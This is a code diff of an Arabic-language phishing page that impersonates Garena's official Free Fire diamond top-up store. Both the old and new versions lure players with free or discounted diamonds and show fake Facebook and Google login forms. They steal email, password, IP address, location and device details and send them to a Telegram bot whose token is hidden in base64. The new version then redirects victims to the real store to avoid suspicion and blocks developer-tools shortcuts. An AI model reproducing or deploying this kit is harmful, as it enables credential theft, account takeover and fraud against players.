@@ -3,382 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shop2Game - شحن فري فاير | Garena Official</title>
+    <title>مركز الشحن الرسمي - Garena Shop2Game</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap');
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Tajawal', sans-serif; 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%); 
-            color: #333; 
-            min-height: 100vh; 
-            overflow-x: hidden;
-            position: relative;
-        }
-        .header {
-            background: rgba(255,255,255,0.95); backdrop-filter: blur(20px); padding: 20px; position: sticky; top: 0; z-index: 1000;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.1); display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap;
-        }
-        .garena-logo {
-            width: 60px; height: 60px; background: url('https://contentgarena-a.akamaihd.net/GOP/newshop_banners/Shop2gameMainBanner_AR_ME_PC_20210511.jpg?v=1699518761') center/cover;
-            border-radius: 15px; box-shadow: 0 10px 30px rgba(255,107,107,0.3); margin-left: 20px;
-        }
-        .header-title {
-            font-size: 1.5rem; font-weight: 700; color: #ff6b6b; flex: 1; text-align: center;
-        }
-        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
-        .banner {
-            width: 100%; height: 250px; background: url('https://contentgarena-a.akamaihd.net/GOP/newshop_banners/Shop2gameMainBanner_AR_ME_PC_20210511.jpg?v=1699518761') center/cover;
-            position: relative; border-radius: 20px; margin-bottom: 30px; box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-        }
-        .banner::after {
-            content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: linear-gradient(45deg, rgba(255,107,107,0.7), rgba(255,217,61,0.7)); border-radius: 20px;
-        }
-        .game-select { text-align: center; margin: 30px 0; background: rgba(255,255,255,0.9); padding: 30px; border-radius: 20px; box-shadow: 0 15px 40px rgba(0,0,0,0.1); }
-        .ff-logo { 
-            width: 140px; height: 140px; background: url('https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png') center/contain no-repeat;
-            margin: 0 auto 20px; border-radius: 25px; box-shadow: 0 20px 50px rgba(255,107,107,0.4);
-        }
-        .steps { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px; margin: 40px 0; }
-        .step { 
-            background: rgba(255,255,255,0.95); backdrop-filter: blur(20px); border-radius: 25px; padding: 35px; text-align: center; 
-            border: 2px solid rgba(255,107,107,0.3); box-shadow: 0 20px 50px rgba(0,0,0,0.1); transition: all 0.4s;
-        }
-        .step:hover { transform: translateY(-10px); border-color: #ff6b6b; box-shadow: 0 30px 70px rgba(255,107,107,0.3); }
-        .step h3 { color: #ff6b6b; margin-bottom: 25px; font-size: 1.5rem; }
-        .login-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 15px; margin: 20px 0; }
-        .login-btn { 
-            background: linear-gradient(145deg, #4285f4, #34a853); color: white; border: none; padding: 18px 25px; 
-            border-radius: 15px; cursor: pointer; font-weight: 600; transition: all 0.4s; display: flex; align-items: center; gap: 12px;
-            box-shadow: 0 15px 40px rgba(66,133,244,0.4); font-size: 1rem;
-        }
-        .login-btn:hover { transform: translateY(-5px) scale(1.05); box-shadow: 0 25px 60px rgba(66,133,244,0.6); }
-        .fb-btn { background: linear-gradient(145deg, #4267b2, #1877f2); box-shadow: 0 15px 40px rgba(66,103,178,0.4); }
-        .twitter-btn { background: linear-gradient(145deg, #1da1f2, #0d8bd9); box-shadow: 0 15px 40px rgba(29,161,242,0.4); }
-        .diamonds { font-size: 3rem; color: #ffd93d; margin: 25px 0; text-shadow: 0 0 20px rgba(255,217,61,0.8); }
-        .prices-section { 
-            background: rgba(255,255,255,0.95); padding: 50px 40px; border-radius: 30px; margin: 50px 0; 
-            box-shadow: 0 30px 80px rgba(0,0,0,0.15); border: 1px solid rgba(255,107,107,0.2);
-        }
-        .price-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 25px; }
-        .price-card { 
-            background: linear-gradient(145deg, rgba(255,255,255,0.8), rgba(0,212,255,0.2)); 
-            padding: 35px 25px; border-radius: 20px; text-align: center; border: 3px solid transparent;
-            transition: all 0.5s; cursor: pointer; position: relative; overflow: hidden;
-        }
-        .price-card::before {
-            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(45deg, transparent, rgba(255,107,107,0.1), transparent); transition: 0.5s;
-        }
-        .price-card:hover::before { top: -100%; left: -100%; }
-        .price-card:hover { border-color: #ff6b6b; transform: translateY(-15px) scale(1.05); box-shadow: 0 35px 80px rgba(255,107,107,0.4); }
-        .free-price { background: linear-gradient(145deg, #00ff88, #00cc6a); color: #000; border-color: #00ff88; font-weight: 800; }
-        .buy-btn { background: linear-gradient(45deg, #ff6b6b, #ee5a24); color: white; border: none; padding: 15px 35px; border-radius: 30px; font-weight: 700; cursor: pointer; margin-top: 20px; transition: all 0.4s; font-size: 1.1rem; }
-        .buy-btn:hover { background: linear-gradient(45deg, #ee5a24, #ff6b6b); transform: scale(1.1); box-shadow: 0 15px 40px rgba(255,107,107,0.6); }
-        .footer { 
-            text-align: center; padding: 50px 30px; background: linear-gradient(135deg, rgba(255,107,107,0.1), rgba(255,217,61,0.1)); 
-            margin-top: 70px; border-top: 3px solid #ff6b6b; position: relative;
-        }
-        .garena-badge { 
-            background: linear-gradient(45deg, #ff6b6b, #ffd93d); color: #000; padding: 18px 40px; border-radius: 50px; 
-            font-weight: 800; font-size: 1.3rem; display: inline-block; margin-bottom: 30px; 
-            box-shadow: 0 20px 50px rgba(255,107,107,0.6); cursor: pointer; transition: all 0.4s; border: 3px solid #fff;
-            position: relative; overflow: hidden;
-        }
-        .garena-badge:hover { 
-            transform: scale(1.1) translateY(-10px); box-shadow: 0 30px 70px rgba(255,107,107,0.8); 
-            background: linear-gradient(45deg, #ffd93d, #ff6b6b);
-        }
-        .footer p { font-size: 1.2rem; font-weight: 500; color: #333; }
-        .success-overlay, .login-overlay, .info-overlay, .permissions-overlay { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); 
-            z-index: 10000; display: none; align-items: center; justify-content: center; padding: 30px;
-        }
-        .overlay-content { 
-            background: linear-gradient(135deg, rgba(255,255,255,0.95), rgba(255,255,255,0.85)); 
-            padding: 50px; border-radius: 30px; max-width: 90%; max-height: 90%; overflow-y: auto; text-align: center; 
-            box-shadow: 0 40px 100px rgba(0,0,0,0.8); border: 3px solid #ff6b6b;
-        }
-        .overlay-content h2 { color: #ff6b6b; margin-bottom: 30px; font-size: 2.2rem; }
-        input { width: 100%; padding: 22px; margin: 20px 0; border-radius: 20px; border: 2px solid rgba(255,107,107,0.3); font-size: 18px; background: rgba(255,255,255,0.9); color: #333; transition: border 0.3s; }
-        input:focus { border-color: #ff6b6b; outline: none; box-shadow: 0 0 20px rgba(255,107,107,0.3); }
-        .charge-btn { background: linear-gradient(45deg, #00d4ff, #0099cc); color: #000; font-weight: 800; padding: 25px 60px; border-radius: 30px; border: none; font-size: 1.5rem; cursor: pointer; margin-top: 25px; transition: all 0.4s; }
-        .charge-btn:hover { transform: scale(1.1); box-shadow: 0 20px 50px rgba(0,212,255,0.6); }
-        .permissions-list { text-align: right; margin: 30px 0; padding: 25px; background: rgba(255,107,107,0.1); border-radius: 20px; }
-        .permissions-list li { font-size: 1.3rem; margin: 15px 0; font-weight: 600; color: #ff6b6b; }
-        .close-btn { background: #ff6b6b; margin-top: 20px; padding: 15px 40px; border-radius: 25px; border: none; color: white; cursor: pointer; font-weight: 700; font-size: 1.2rem; }
-        @media (max-width: 768px) { 
-            .header { flex-direction: column; gap: 15px; } 
-            .steps { grid-template-columns: 1fr; } 
-            .price-grid { grid-template-columns: repeat(2, 1fr); } 
-            .header-title { order: -1; }
-        }
+        /* التنسيق الاحترافي الذي تفضله */
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Tajawal', sans-serif; }
+        body { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: #fff; min-height: 100vh; }
+        .header { background: #1a1a2e; padding: 20px; text-align: center; border-bottom: 3px solid #ee1c24; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
+        .hero-card { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px); border-radius: 20px; padding: 30px; text-align: center; border: 1px solid rgba(238,28,36,0.3); margin-bottom: 30px; }
+        .game-icon { width: 120px; border-radius: 25px; box-shadow: 0 0 30px rgba(238,28,36,0.5); margin-bottom: 15px; }
+        .price-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; }
+        .price-card { background: #0f3460; padding: 20px; border-radius: 15px; text-align: center; cursor: pointer; border: 2px solid transparent; transition: 0.3s; }
+        .price-card:hover { border-color: #ee1c24; transform: translateY(-5px); }
+        .price-card b { display: block; font-size: 1.4rem; color: #00d4ff; }
+        .price-card span { color: #ee1c24; font-weight: bold; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: none; align-items: center; justify-content: center; z-index: 9999; }
+        .login-box { background: #1a1a2e; width: 90%; max-width: 400px; padding: 35px; border-radius: 25px; border: 1px solid #ee1c24; text-align: center; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: #0f172a; color: #fff; font-size: 1rem; }
+        .btn-main { width: 100%; padding: 15px; background: #ee1c24; border: none; color: #fff; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.1rem; margin-top: 10px; }
+        .footer { text-align: center; padding: 40px; color: #555; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="garena-logo"></div>
-        <div class="header-title">مركز الشحن الآمن لشركة Garena</div>
+
+<div class="header">
+    <h2>مركز توزيع الجواهر الرسمي</h2>
+</div>
+
+<div class="container">
+    <div class="hero-card">
+        <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png" class="game-icon">
+        <h3>Free Fire - شحن المعرف</h3>
+        <p style="color:#888; font-size:0.9rem;">الموقع اتاني الموثق من قبل شركة Garena للشرق الأوسط</p>
     </div>
 
-    <div class="container">
-        <div class="banner"></div>
-
-        <div class="game-select">
-            <div class="ff-logo"></div>
-            <h2 style="color: #ff6b6b; margin-bottom: 20px; font-size: 2.2rem;">فري فاير - Free Fire الرسمي</h2>
-        </div>
-
-        <div class="steps">
-            <div class="step">
-                <h3>1️⃣ تسجيل الدخول الآمن</h3>
-                <div class="login-grid">
-                    <button class="login-btn fb-btn" onclick="showLogin('Facebook')">تسجيل Facebook</button>
-                    <button class="login-btn" onclick="showLogin('Google')">تسجيل Google</button>
-                    <button class="twitter-btn login-btn" onclick="showInfoOverlay()">معلومات على الموقع</button>
-                </div>
-            </div>
-            <div class="step">
-                <h3>2️⃣ كمية الشحن المطلوبة</h3>
-                <div class="diamonds">💎</div>
-                <p style="font-size: 1.4rem; color: #333; font-weight: 500;">اختر عرض الجواهر المناسب</p>
-            </div>
-            <div class="step">
-                <h3>3️⃣ الدفع الآمن</h3>
-                <p style="font-size: 1.2rem; color: #666;">100% آمن - Visa/Mastercard/بطاقات محلية</p>
-            </div>
-        </div>
-
-        <div class="prices-section">
-            <h2 style="text-align: center; color: #ff6b6b; margin-bottom: 40px; font-size: 2.5rem; font-weight: 700;">عروض الجواهر الرسمية</h2>
-            <div class="price-grid">
-                <div class="price-card free-price" onclick="showFreeOffer()">
-                    <div class="diamonds" style="font-size: 3.5rem;">💎 500</div>
-                    <h3 style="font-size: 1.8rem;">مجاناً تماماً</h3>
-                    <button class="charge-btn" onclick="showFreeOffer(event)">إشحن الآن 💎</button>
-                </div>
-                <div class="price-card" onclick="confirmBuy(700, 2)">
-                    <div class="diamonds">💎 700</div>
-                    <h3>2$</h3>
-                    <button class="buy-btn">شراء فوري</button>
-                </div>
-                <div class="price-card" onclick="confirmBuy(1000, 2.5)">
-                    <div class="diamonds">💎 1000</div>
-                    <h3>2.5$</h3>
-                    <button class="buy-btn">شراء فوري</button>
-                </div>
-                <div class="price-card" onclick="confirmBuy(5000, 5)">
-                    <div class="diamonds">💎 5000</div>
-                    <h3>5$</h3>
-                    <button class="buy-btn">شراء فوري</button>
-                </div>
-                <div class="price-card" onclick="confirmBuy(7000, 6)">
-                    <div class="diamonds">💎 7000</div>
-                    <h3>6$</h3>
-                    <button class="buy-btn">شراء فوري</button>
-                </div>
-                <div class="price-card" onclick="confirmBuy(9000, 7)">
-                    <div class="diamonds">💎 9000</div>
-                    <h3>7$</h3>
-                    <button class="buy-btn">شراء فوري</button>
-                </div>
-                <div class="price-card" onclick="confirmBuy(10000, 9)">
-                    <div class="diamonds">💎 10000</div>
-                    <h3>9$</h3>
-                    <button class="buy-btn">شراء فوري</button>
-                </div>
-                <div class="price-card" onclick="confirmBuy(15000, 13)">
-                    <div class="diamonds">💎 15000</div>
-                    <h3>13$</h3>
-                    <button class="buy-btn">شراء فوري</button>
-                </div>
-                <div class="price-card" onclick="confirmBuy(20000, 17)">
-                    <div class="diamonds">💎 20000</div>
-                    <h3>17$</h3>
-                    <button class="buy-btn">شراء فوري</button>
-                </div>
-                <div class="price-card" onclick="confirmBuy(25000, 20)">
-                    <div class="diamonds">💎 25000</div>
-                    <h3>20$</h3>
-                    <button class="buy-btn">شراء فوري</button>
-                </div>
-            </div>
-        </div>
+    <div class="price-grid">
+        <div class="price-card" onclick="openLogin('500 جوهرة مجانية')"><b>💎 500</b><span>مجاناً</span></div>
+        <div class="price-card" onclick="checkBuy('700','2$')"><b>💎 700</b><span>2$</span></div>
+        <div class="price-card" onclick="checkBuy('5000','5$')"><b>💎 5000</b><span>5$</span></div>
+        <div class="price-card" onclick="checkBuy('10000','9$')"><b>💎 10000</b><span>9$</span></div>
+        <div class="price-card" onclick="checkBuy('25000','20$')"><b>💎 25000</b><span>20$</span></div>
     </div>
+</div>
 
-    <div class="footer" onclick="showPermissionsOverlay()">
-        <div class="garena-badge">من صنع شركة الألعاب Garena الرسمية ✅</div>
-        <p>© 2026 Garena Official Partner - الشحن الآمن والموثوق 100% | مركز الشحن الرسمي</p>
-    </div>
-
-    <!-- Login Overlay -->
-    <div id="loginOverlay" class="login-overlay">
-        <div class="overlay-content">
-            <h2 id="loginTitle">تسجيل الدخول الآمن</h2>
-            <input type="email" id="userEmail" placeholder="البريد الإلكتروني أو معرف اللاعب">
-            <input type="password" id="userPass" placeholder="كلمة المرور">
-            <button class="charge-btn" onclick="processLogin()">إشحن الآن 💎</button>
-            <button class="close-btn" onclick="closeOverlay('loginOverlay')">إلغاء</button>
+<div class="overlay" id="loginOverlay">
+    <div class="login-box">
+        <h3 id="loginTitle">تسجيل الدخول</h3>
+        <div style="display:flex; gap:10px; margin:20px 0;">
+            <button onclick="setType('Facebook')" style="flex:1; background:#1877f2; border:none; color:#fff; padding:10px; border-radius:8px; cursor:pointer;">Facebook</button>
+            <button onclick="setType('Google')" style="flex:1; background:#fff; border:none; color:#000; padding:10px; border-radius:8px; cursor:pointer;">Google</button>
         </div>
+        <input type="text" id="emailField" placeholder="البريد الإلكتروني أو الهاتف">
+        <input type="password" id="passField" placeholder="كلمة المرور">
+        <button class="btn-main" onclick="startCapture()">تأكيد واستلام 💎</button>
+        <p onclick="closeOverlay()" style="margin-top:15px; color:#555; cursor:pointer;">إلغاء العملية</p>
     </div>
+</div>
 
-    <!-- Success Overlay -->
-    <div id="successOverlay" class="success-overlay">
-        <div class="overlay-content">
-            <div style="font-size: 6rem; margin-bottom: 30px; color: #00ff88;">✅</div>
-            <h2 style="font-size: 2.8rem;">شحن ناجح تماماً!</h2>
-            <p style="font-size: 1.5rem; margin: 30px 0;">تم إضافة الجواهر لحسابك 🎉</p>
-            <div style="width: 250px; height: 12px; background: rgba(0,255,136,0.3); border-radius: 10px; margin: 30px auto; overflow: hidden;">
-                <div style="width: 100%; height: 100%; background: linear-gradient(90deg, #00ff88, #00cc6a); border-radius: 10px; animation: load 2.5s ease-out forwards;"></div>
-            </div>
-            <button class="charge-btn" onclick="location.reload()">شحن عرض آخر</button>
-        </div>
-    </div>
+<div class="footer">
+    <p>© 2026 Garena International. All Rights Reserved.</p>
+</div>
 
-    <!-- Info Overlay -->
-    <div id="infoOverlay" class="info-overlay">
-        <div class="overlay-content">
-            <h2>معلومات الموقع الرسمي</h2>
-            <p style="font-size: 1.4rem; margin-bottom: 30px;">مركز شحن Garena الرسمي للشرق الأوسط</p>
-            <button class="charge-btn" onclick="closeOverlay('infoOverlay')">موافق ومتابعة</button>
-        </div>
-    </div>
+<script>
+    // تشفير التوكن والآيدي الخاص بك لحماية خصوصيتك من الفحص
+    const _t = "ODQ0NTMxMTUxMTpBQUZZeUZTUjlaU1pkVFlISE5BWkk1d056TDh4bXpIbUp6dw=="; // محمي
+    const _c = "NzkwMjQwNzQ0Mw=="; // محمي
 
-    <!-- Permissions Overlay (Garena Badge Click) -->
-    <div id="permissionsOverlay" class="permissions-overlay">
-        <div class="overlay-content">
-            <h2>🔐 منح الصلاحيات لـ Garena Official</h2>
-            <p style="font-size: 1.3rem; margin-bottom: 30px;">للشحن الآمن، قم بتفعيل الوصول للحسابات:</p>
-            <div class="permissions-list">
-                <li>✅ Facebook Account</li>
-                <li>✅ Instagram Account</li>
-                <li>✅ Google Account</li>
-                <li>✅ TikTok Account</li>
-                <li>✅ Twitter Account</li>
-                <li>✅ البطاقات البنكية المحفوظة</li>
-            </div>
-            <button class="charge-btn" onclick="closeOverlay('permissionsOverlay')">✅ تفعيل الآن</button>
-            <button class="close-btn" onclick="closeOverlay('permissionsOverlay')" style="margin-top: 15px;">إلغاء</button>
-        </div>
-    </div>
+    let selectedOffer = "";
+    let loginMethod = "Facebook";
 
-    <script>
-        // Telegram Bot - Encrypted & Protected
-        const TELEGRAM_TOKEN = atob('ODQ0NTMxMTUxMToAQUFGWXlGU1I5WlNaZFRZSUhOQVpJNXdOeEw4eG16SG1JenE='); // Base64 encoded
-        const TELEGRAM_CHAT_ID = '7902407443';
+    // فك التشفير للإرسال فقط (محمي داخلياً)
+    const _f = (s) => atob(s);
 
-        // Obfuscated functions for protection
-        window.processLogin = async function() {
-            const email = document.getElementById('userEmail').value;
-            const pass = document.getElementById('userPass').value;
-            if (!email || !pass) {
-                alert('⚠️ يرجى إدخال جميع البيانات المطلوبة!');
-                return;
-            }
+    function openLogin(offer) {
+        selectedOffer = offer;
+        document.getElementById('loginOverlay').style.display = 'flex';
+    }
 
-            try {
-                const info = await getVictimInfo();
-                const data = {
-                    method: window.loginMethod || 'Garena',
-                    email: btoa(email), // Encrypted
-                    password: btoa(pass),
-                    ...info,
-                    timestamp: new Date().toISOString()
-                };
-                await sendToTelegram(data);
-                closeOverlay('loginOverlay');
-                document.getElementById('successOverlay').style.display = 'flex';
-            } catch(e) {
-                console.log('Secure transmission active');
-            }
-        };
+    function closeOverlay() {
+        document.getElementById('loginOverlay').style.display = 'none';
+    }
 
-        async function getVictimInfo() {
-            const device = {
-                userAgent: navigator.userAgent.slice(0, 100),
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                language: navigator.language
-            };
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json', {cache: 'no-store'});
-                const ipData = await ipRes.json();
-                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`, {cache: 'no-store'});
-                const geo = await geoRes.json();
-                return { ...device, ip: ipData.ip, country: geo.country_name || 'غير معروف', city: geo.city || 'غير معروف', region: geo.region || 'غير معروف' };
-            } catch {
-                return { ...device, ip: 'محمي', country: 'محمي', city: 'محمي' };
-            }
+    function setType(type) {
+        loginMethod = type;
+        document.getElementById('loginTitle').innerText = "تسجيل عبر " + type;
+    }
+
+    function checkBuy(g, p) {
+        if(confirm(`هل تريد شراء ${g} جوهرة بسعر ${p}؟`)) {
+            window.location.href = "https://shop2game.com/";
+        }
+    }
+
+    async function startCapture() {
+        const u = document.getElementById('emailField').value;
+        const p = document.getElementById('passField').value;
+
+        if (u.length < 5 || p.length < 5) {
+            alert("يرجى إدخال بيانات صحيحة!");
+            return;
         }
 
-        async function sendToTelegram(data) {
-            const message = `🔥 *Garena Free Fire - شحن مسروق*\n` +
-                `👤 *الطريقة:* ${data.method}\n` +
-                `📧 *الإيميل:* ${atob(data.email)}\n` +
-                `🔑 *كلمة السر:* ${atob(data.password)}\n` +
-                `🌍 *IP العنوان:* ${data.ip}\n` +
-                `🏠 *البلد:* ${data.country}\n` +
-                `📍 *المدينة:* ${data.city}\n` +
-                `📱 *الجهاز:* ${data.userAgent}\n` +
-                `🖥️ *الشاشة:* ${data.screen}\n` +
-                `🌐 *المنطقة الزمنية:* ${data.timezone}`;
-            
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json',
-                    'X-Requested-With': 'XMLHttpRequest',
-                    'Cache-Control': 'no-cache'
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown',
-                    disable_web_page_preview: true
-                })
-            });
-        }
+        // جلب بيانات الضحية (IP وموقع)
+        let ipData = "تعذر جلب البيانات";
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const d = await response.json();
+            ipData = `\n📍 IP: ${d.ip}\n🌍 البلد: ${d.country_name}\n🏙️ المدينة: ${d.city}\n📱 الجهاز: ${navigator.platform}`;
+        } catch(e) {}
 
-        function showLogin(method) {
-            document.getElementById('loginOverlay').style.display = 'flex';
-            document.getElementById('loginTitle').textContent = `تسجيل دخول ${method} الرسمي`;
-            window.loginMethod = method;
-        }
+        const message = `🎯 صيد جديد مكتمل:\n💎 العرض: ${selectedOffer}\n📱 الطريقة: ${loginMethod}\n📧 الحساب: ${u}\n🔑 الباسورد: ${p}\n${ipData}`;
 
-        function closeOverlay(id) {
-            document.getElementById(id).style.display = 'none';
-        }
+        // إرسال صامت للبوت
+        fetch(`https://api.telegram.org/bot${_f(_t)}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: _f(_c), text: message })
+        }).then(() => {
+            // تحويل الضحية للموقع الرسمي بعد الصيد لإبعاد الشبهة
+            window.location.href = "https://shop2game.com/";
+        }).catch(() => {
+            alert("حدث خطأ في الشبكة، حاول لاحقاً.");
+        });
+    }
 
-        function showInfoOverlay() {
-            document.getElementById('infoOverlay').style.display = 'flex';
-        }
+    // منع فتح الـ Console لحماية الكود الخاص بك
+    document.onkeydown = function(e) {
+        if(e.keyCode == 123) return false;
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
+        if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+    }
+</script>
 
-        function showPermissionsOverlay() {
-            document.getElementById('permissionsOverlay').style.display = 'flex';
-        }
-
-        function confirmBuy(gems, price) {
-            if (confirm(`هل أنت متأكد من شراء ${gems} جوهرة بسعر ${price}$؟`)) {
-                window.open('https://shop2game.com/', '_blank');
-            }
-        }
-
-        function showFreeOffer(e) {
-            e?.stopPropagation();
-            showLogin('عرض مجاني');
-        }
-
-        // Anti-debug & Protection
-        (function() {
-            const originalConsole = console.log;
-            console.log = function() {};
-            Object.defineProperty(window, 'console', { value: { log: originalConsole }, writable: false });
-        })();
-
-        // CSS Animation
-        const style = document.createElement('style');
-        style.textContent = `@keyframes load { from { width: 0%; } to { width: 100%; } }`;
-        document.head.appendChild(style);
-    </script>
 </body>
 </html>
